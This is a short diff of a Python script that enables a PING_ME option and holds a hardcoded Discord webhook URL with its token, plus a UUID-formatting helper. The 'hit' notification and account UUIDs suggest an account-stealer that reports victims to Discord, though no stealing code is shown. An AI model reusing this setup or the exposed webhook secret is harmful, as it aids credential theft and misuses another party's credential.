@@ -6,7 +6,7 @@ from urllib.request import Request, urlopen
 WEBHOOK_URL = "https://discord.com/api/webhooks/1212578680635654224/Z3ILBMJJfhhBgBYRKrE06QM3HaPaSRelT5yogL4uPz7rJY9NiYQWQlg5gSs1X_3K0kh3"
 
 # mentions you when you get a hit
-PING_ME = False
+PING_ME = True
 
 def uuid_dashed(uuid):
     return f"{uuid[0:8]}-{uuid[8:12]}-{uuid[12:16]}-{uuid[16:21]}-{uuid[21:32]}"
